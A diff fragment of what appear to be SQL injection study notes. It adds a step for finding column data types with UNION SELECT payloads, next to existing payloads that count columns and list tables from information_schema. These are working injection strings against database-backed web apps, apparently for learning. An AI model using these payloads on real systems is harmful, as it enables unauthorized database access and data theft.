@@ -55,6 +55,10 @@ Answer: ' order by 1 (it's means 1 column exist)
 1=> First verify the number of columns
 ' UNION SELECT NULL,NULL--
 
+1a=> Determine the data type of the columns
+
+' UNION SELECT 'a',NULL,NULL | ' UNION SELECT NULL,'a',NULL | ' UNION SELECT NULL,NULL,'a'
+
 2=> Determine the tables
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 
